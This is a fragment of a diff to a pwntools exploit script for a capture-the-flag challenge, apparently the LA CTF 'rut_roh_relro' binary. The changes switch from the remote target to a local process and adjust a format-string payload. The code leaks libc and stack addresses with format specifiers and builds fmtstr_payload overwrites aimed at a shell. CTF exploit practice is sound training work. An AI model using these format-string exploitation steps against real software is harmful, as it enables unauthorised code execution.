@@ -9,16 +9,19 @@ ld = ELF("./ld-2.31.so")
 
 context.binary = exe
 
-#p = process("./rut_roh_relro_patched")
+p = process("./rut_roh_relro_patched")
 #gdb.attach(p)
 
-p = remote("lac.tf", 31134)
+#p = remote("lac.tf", 31134)
 
 # out = ""
 # for i in range(40, 80):
 #     out += f"{i}=%{i}$p "
+
+# log.info(f"{out = }")
 # p.recvuntil(b"post?")
 # p.sendline(out.encode())
+# p.interactive()
 
 # leak libc 
 p.sendline(b"libc= %71$p, stack= %72$p")
@@ -65,7 +68,8 @@ writes_binsh = {
     # ret_ptr_main+0x20: libc_exit 
 }
 
-second_payload = fmtstr_payload(6, writes_binsh)
+second_payload = fmtstr_payload(6, writes_r12)
+log.info(f"{second_payload = }")
 
 p.recvuntil(b"post?")
 p.sendline(second_payload)
